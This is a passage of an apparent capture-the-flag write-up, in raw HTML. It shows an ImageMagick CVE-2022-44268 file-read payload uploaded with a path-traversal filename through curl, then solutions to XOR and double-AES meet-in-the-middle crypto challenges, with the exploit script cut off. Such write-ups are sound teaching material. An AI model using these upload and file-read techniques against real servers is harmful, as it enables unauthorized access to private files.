</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>211</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;\ud83d\udea8 ATTACK DETECTED! Malicious executable detected on the union network. All gallery files have been wiped for security. The Sorcerer&#39;s Council has been notified.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;success&#34;</span><span class=p>:</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>Create a new <code>logo.png</code> using this <a href=https://git.rotfl.io/v/CVE-2022-44268>POC script</a> for the ImageMagick exploit.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>cargo run <span class=s2>&#34;flag.txt&#34;</span>
</span></span></code></pre></div><ul><li>Send another <code>POST</code> request to <code>/uploads</code> using the above generated image (rename it to <code>logo.png</code>)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>curl -XPOST <span class=s1>&#39;http://play.scriptsorcerers.xyz:10152/upload&#39;</span> -ik -F <span class=s2>&#34;file=@logo.png;filename=../logo.png&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Werkzeug/3.1.3 Python/3.10.18</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>154</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;\ud83c\udf89 Spell cast successfully! \&#34;../logo.png\&#34; has been added to the gallery (0.0 MB)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;redirect&#34;</span><span class=p>:</span> <span class=s2>&#34;/gallery&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;success&#34;</span><span class=p>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>Now download <code>logo-sm.png</code> from the server and hex decode its content to read the flag</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>curl -s <span class=s1>&#39;http://play.scriptsorcerers.xyz:10152/logo-sm.png&#39;</span> -o - <span class=p>|</span> xxd -r -p
</span></span></code></pre></div><pre tabindex=0><code>9scriptCTF{t00_much_m46ic_66d090e352fa}
</code></pre><h2 id=crypto>Crypto</h2><h3 id=secure-server-100>Secure-Server (100)</h3><blockquote><p>John Doe uses this secure server where plaintext is never shared. Our Forensics Analyst was able to capture this traffic and the source code for the server. Can you recover John Doe&rsquo;s secrets?</p></blockquote><p>This challenge&rsquo;s attachment had a pcap file and a python script.</p><p><strong>server.py:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>xor</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;With the Secure Server, sharing secrets is safer than ever!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter the secret, XORed by your key (in hex): &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc2</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>enc</span><span class=p>,</span><span class=n>key</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Double encrypted secret (in hex): </span><span class=si>{</span><span class=n>enc2</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dec</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;XOR the above with your key again (in hex): &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>dec</span><span class=p>,</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Secret received!&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>It tries to implement <a href=https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange>Diffie-Hellman Key Exchange</a>. But instead of using a secure one way operation like modular exponentiation, it simply uses xor. Since xor is easy to reverse we can determine the actual secret.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>Ka</span>       <span class=o>=</span> <span class=n>key</span> <span class=n>of</span> <span class=n>user</span> <span class=n>a</span>
</span></span><span class=line><span class=cl><span class=n>Kb</span>       <span class=o>=</span> <span class=n>key</span> <span class=n>of</span> <span class=n>user</span> <span class=n>b</span>
</span></span><span class=line><span class=cl><span class=n>secret</span>   <span class=o>=</span> <span class=n>flag</span> <span class=c1># probably</span>
</span></span><span class=line><span class=cl><span class=n>secret_B</span> <span class=o>=</span> <span class=n>secret</span> <span class=o>^</span> <span class=n>Kb</span>
</span></span><span class=line><span class=cl><span class=n>dec</span>      <span class=o>=</span> <span class=n>secret_B</span> <span class=o>^</span> <span class=n>kA</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Let&#39;s try to solve it</span>
</span></span><span class=line><span class=cl><span class=n>pt</span>       <span class=o>-&gt;</span> <span class=n>plaintext</span>
</span></span><span class=line><span class=cl><span class=n>secret</span>   <span class=o>=</span>  <span class=n>Ka</span> <span class=o>^</span> <span class=n>pt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>secret_B</span> <span class=o>=</span>  <span class=n>secret</span>  <span class=o>^</span> <span class=n>kB</span>
</span></span><span class=line><span class=cl>         <span class=o>=</span>  <span class=n>Ka</span> <span class=o>^</span> <span class=n>pt</span> <span class=o>^</span> <span class=n>kB</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dec</span>      <span class=o>=</span>    <span class=n>secret_B</span>   <span class=o>^</span> <span class=n>kA</span>
</span></span><span class=line><span class=cl>		 <span class=o>=</span>  <span class=n>Ka</span> <span class=o>^</span> <span class=n>pt</span> <span class=o>^</span> <span class=n>kB</span> <span class=o>^</span> <span class=n>kA</span>
</span></span><span class=line><span class=cl>         <span class=o>=</span>  <span class=n>pt</span> <span class=o>^</span> <span class=n>kB</span>
</span></span></code></pre></div><p>From the network packets we can retrieve the values for <code>secret</code>, <code>secret_B</code>, and <code>Dec</code></p><p><img src=/img/scriptctf-25/Pasted%20image%2020250818220057.webp></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># To find pt we have to xor these 3 vaues</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pt</span> <span class=o>=</span> <span class=n>secret</span>  <span class=o>^</span>   <span class=n>secret_B</span>    <span class=o>^</span>   <span class=n>Dec</span>
</span></span><span class=line><span class=cl>   <span class=o>=</span> <span class=n>kA</span> <span class=o>^</span> <span class=n>pt</span> <span class=o>^</span> <span class=n>kA</span> <span class=o>^</span> <span class=n>pt</span> <span class=o>^</span> <span class=n>kB</span>  <span class=o>^</span> <span class=n>pt</span> <span class=o>^</span> <span class=n>kB</span>
</span></span><span class=line><span class=cl>   <span class=o>=</span> <span class=n>pt</span> <span class=o>^</span> <span class=n>pt</span> <span class=o>^</span> <span class=n>pt</span>
</span></span><span class=line><span class=cl>   <span class=o>=</span> <span class=n>pt</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>xor</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span>    <span class=s2>&#34;151e71ce4addf692d5bac83bb87911a20c39b71da3fa5e7ff05a2b2b0a83ba03&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>secret_B</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span>    <span class=s2>&#34;e1930164280e44386b389f7e3bc02b707188ea70d9617e3ced989f15d8a10d70&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dec</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;87ee02c312a7f1fef8f92f75f1e60ba122df321925e8132068b0871ff303960e&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>xor</span><span class=p>(</span><span class=n>secret</span><span class=p>,</span> <span class=n>secret_B</span><span class=p>,</span> <span class=n>dec</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></div><p><img src=/img/scriptctf-25/Pasted%20image%2020250818220744.webp></p><h3 id=secure-server-2-432>Secure-Server 2 (432)</h3><blockquote><p>This time, the server is even more secure, but did it actually receive the secret? Simple brute-force won&rsquo;t work!</p></blockquote><p>This is similar to secure server 1, but now instead of XOR it double encrypts the secret with AES.
This is vulnerable to <a href=https://en.wikipedia.org/wiki/Meet-in-the-middle_attack>meet-in-the-middle attack</a>.</p><p><strong>johndoes.py:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>k1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;AA&#34;</span>  <span class=c1># Obviously not the actual key</span>
</span></span><span class=line><span class=cl><span class=n>k2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;AA&#34;</span>  <span class=c1># Obviously not the actual key</span>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;scriptCTF{testtesttesttesttest!_&#34;</span>  <span class=c1># Obviously not the actual flag</span>
</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=p>[</span><span class=n>k1</span><span class=p>,</span> <span class=n>k2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>final_keys</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>keys</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span>  <span class=c1># 2 byte key into binary</span>
</span></span><span class=line><span class=cl>    <span class=n>final_keys</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>final_keys</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cipher2</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>final_keys</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc2</span> <span class=o>=</span> <span class=n>cipher2</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>message</span><span class=p>))</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>enc2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>to_dec</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Dec: &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>cipher2</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>to_dec</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>secret</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span></code></pre></div><p>This will encrypt the message twice, first using <code>k1</code> and then using <code>k2</code>.</p><p><strong>server.py:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;With the Secure Server 2, sharing secrets is safer than ever! We now support double encryption with AES!&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter the secret, encrypted twice with your keys (in hex): &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Our proprietary key generation method, used by the server and John Doe himself!</span>
</span></span><span class=line><span class=cl><span class=n>k3</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;BB&#34;</span>  <span class=c1># Obviously not the actual key</span>
</span></span><span class=line><span class=cl><span class=n>k4</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;B}&#34;</span>  <span class=c1># Obviously not the actual key</span>
</span></span><span class=line><span class=cl><span class=c1># flag = secret_message + k1 + k2 + k3 + k4 (where each key is 2 bytes)</span>
</span></span><span class=line><span class=cl><span class=c1># In this case: scriptCTF{testtesttesttesttest!_AAAABBB}</span>
</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=p>[</span><span class=n>k3</span><span class=p>,</span> <span class=n>k4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>final_keys</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>keys</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span>  <span class=c1># 2 byte key into binary</span>
</span></span><span class=line><span class=cl>    <span class=n>final_keys</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>final_keys</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cipher2</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>final_keys</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>mode</span><span class=o>=</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc2</span> <span class=o>=</span> <span class=n>cipher2</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>enc</span><span class=p>))</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Quadriple encrypted secret (in hex): </span><span class=si>{</span><span class=n>enc2</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dec</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Decrypt the above with your keys again (in hex): &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>cipher2</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>dec</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Secret received!&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>This will encrypt the double encrypted message twice again using <code>k3</code> and <code>k4</code>. Flag consists of message and all four keys. We have output of the <code>server.py</code> from the network capture:</p><pre tabindex=0><code>With the Secure Server 2, sharing secrets is safer than ever! We now support double encryption with AES!
Enter the secret, encrypted twice with your keys (in hex): 19574ac010cc9866e733adc616065e6c019d85dd0b46e5c2190c31209fc57727
Quadriple encrypted secret (in hex): 0239bcea627d0ff4285a9e114b660ec0e97f65042a8ad209c35a091319541837
Decrypt the above with your keys again (in hex): 4b3d1613610143db984be05ef6f37b31790ad420d28e562ad105c7992882ff34
Secret received!
</code></pre><p>The three values can be written like this:</p><pre tabindex=0><code>e_k1 -&gt; encryption using k1
e_k2 -&gt; encryption using k2
e_k3 -&gt; encryption using k3
e_k4 -&gt; encryption using k4
d_k1 -&gt; decryption using k1
d_k2 -&gt; decryption using k2

enc   = e_k2(e_k1(msg))   = 19574ac010cc9866e733adc616065e6c019d85dd0b46e5c2190c31209fc57727
q_enc = e_k4(e_k3(enc))   = 0239bcea627d0ff4285a9e114b660ec0e97f65042a8ad209c35a091319541837
dec   = d_k1(d_k2(q_enc)) = 4b3d1613610143db984be05ef6f37b31790ad420d28e562ad105c7992882ff34
</code></pre><p>From this we can arrive at:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>e_k1</span><span class=p>(</span><span class=n>dec</span><span class=p>)</span> <span class=o>==</span> <span class=n>d_k2</span><span class=p>(</span><span class=n>q_enc</span><span class=p>)</span> 
</span></span></code></pre></div><p>To find <code>k1</code> and <code>k2</code> we will first create a lookup tables of values produced from <code>e_k1(dec)</code> with all possible <code>k1</code> values. Then we will run <code>d_k2(q_enc)</code> with all possible <code>k2</code> values and check if the produced value is present in the table. If it does then we can confirm the <code>k1</code> and <code>k2</code> values are correct.</p><p>Similarly we can find <code>k3</code> and <code>k4</code> by using:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>d_k4</span><span class=p>(</span><span class=n>q_enc</span><span class=p>)</span> <span class=o>==</span> <span class=n>e_k3</span><span class=p>(</span><span class=n>enc</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>Exploit:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>defaultdict</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ENC_HEX</span> <span class=o>=</span> <span class=s2>&#34;19574ac010cc9866e733adc616065e6c019d85dd0b46e5c2190c31209fc57727&#34;</span>
</span></span><span class=line><span class=cl><span class=n>QUAD_HEX</span> <span class=o>=</span> <span class=s2>&#34;0239bcea627d0ff4285a9e114b660ec0e97f65042a8ad209c35a091319541837&#34;</span>
</span></span><span class=line><span class=cl><span class=n>DEC_HEX</span> <span class=o>=</span> <span class=s2>&#34;4b3d1613610143db984be05ef6f37b31790ad420d28e562ad105c7992882ff34&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>ENC_HEX</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>q_enc</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>QUAD_HEX</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dec</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>DEC_HEX</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_aes_key_from_2bytes</span><span class=p>(</span><span class=n>key</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bin</span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>])[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mitm_find_k1_k2</span><span class=p>(</span><span class=n>quad_bytes</span><span class=p>,</span> <span class=n>dec_bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k1</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>k1b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([(</span><span class=n>k1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=n>k1</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=n>make_aes_key_from_2bytes</span><span class=p>(</span><span class=n>k1b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>d1</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>dec_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>table</span><span class=p>[</span><span class=n>d1</span><span class=p>]</span> <span class=o>=</span> <span class=n>k1b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>k2b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([(</span><span class=n>k2</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=n>k2</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>key2</span> <span class=o>=</span> <span class=n>make_aes_key_from_2bytes</span><span class=p>(</span><span class=n>k2b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher2</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key2</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>e2</span> <span class=o>=</span> <span class=n>cipher2</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>quad_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>e2</span> <span class=ow>in</span> <span class=n>table</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>solutions</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>table</span><span class=p>[</span><span class=n>e2</span><span class=p>],</span> <span class=n>k2b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>solutions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mitm_find_k3_k4</span><span class=p>(</span><span class=n>enc_bytes</span><span class=p>,</span> <span class=n>quad_bytes</span><span class=p>,</span> <span class=n>k4_last_byte</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>()</span>
